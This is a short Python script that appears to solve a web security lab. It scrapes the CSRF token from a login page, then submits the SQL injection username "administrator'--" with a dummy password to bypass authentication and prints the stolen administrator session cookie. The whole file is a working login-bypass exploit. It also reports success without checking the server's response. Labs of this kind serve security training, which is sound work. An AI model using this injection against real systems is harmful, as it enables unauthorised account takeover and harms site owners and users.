import sys
import requests
from bs4 import BeautifulSoup

def main():
    url = sys.argv[1].rstrip('/')
    response = requests.get(f'{url}/login')
    cookies = response.cookies.values()[0]
    
    #extracting csrf token
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']

    data = {
        "csrf": csrf_token,
        "username": "administrator'--",
        "password": "random"

    }

    login_response = requests.post(data=data, url=f'{url}/login', cookies={"session": cookies}, allow_redirects=False)
    print(f"Successfully authenticated as Administrator user. User's cookie: session={login_response.cookies.values()[0]}")

if __name__ == "__main__":
    main()
